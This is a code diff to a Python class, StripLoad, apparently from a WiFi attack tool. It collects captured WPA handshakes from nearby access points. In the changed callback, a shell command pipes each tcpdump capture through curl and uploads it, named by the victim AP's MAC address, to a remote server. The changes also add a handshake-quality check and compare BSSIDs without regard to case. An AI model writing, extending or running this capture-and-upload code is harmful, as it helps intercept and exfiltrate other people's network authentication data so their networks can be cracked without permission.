@@ -43,14 +43,17 @@ class StripLoad(multiprocessing.Process):
         self._writer.write(pckt)
 
     def _new_auth_callback(self, (sta, auth)):
-        logging.info("got new hs of %s" % str(sta.ap.mac))
-        p = subprocess.Popen("/usr/sbin/tcpdump -r " + self._outfile.name +
-                             " | /usr/bin/curl --form upfile=@- http://" +
-                             "%s:%d" % self._server,
+        logging.info("got new hs of %s (%d)" % (str(sta.ap.mac), auth.quality))
+        cmd_str = "/usr/sbin/tcpdump -r %s -w - | " \
+                  "/usr/bin/curl --form \"upfile=@-;filename=%s.dump\" " \
+                  "http://%s:%d" % (self._outfile.name, str(sta.ap.mac),
+                                    self._server[0], self._server[1])
+        p = subprocess.Popen(cmd_str,
                              stdout=open(os.devnull, 'w'),
                              stderr=subprocess.STDOUT, shell=True)
         p.wait()
-        self._uploaded_queue.put(sta.ap.mac)
+        if auth.quality == 0:
+            self._uploaded_queue.put(sta.ap.mac)
 
     def run(self):
         try:
@@ -75,8 +78,9 @@ class StripLoad(multiprocessing.Process):
             try:
                 mac = self._uploaded_queue.get(timeout=wait)
                 logging.info("%s uploaded" % str(mac))
+                logging.debug("+ %s, %s" % (str(target.bssid), str(mac)))
                 self._uploaded.add(mac)
-                if target.bssid == mac:
+                if target.bssid.lower() == mac.lower():
                     return
             except multiprocessing.queues.Empty:
                 break
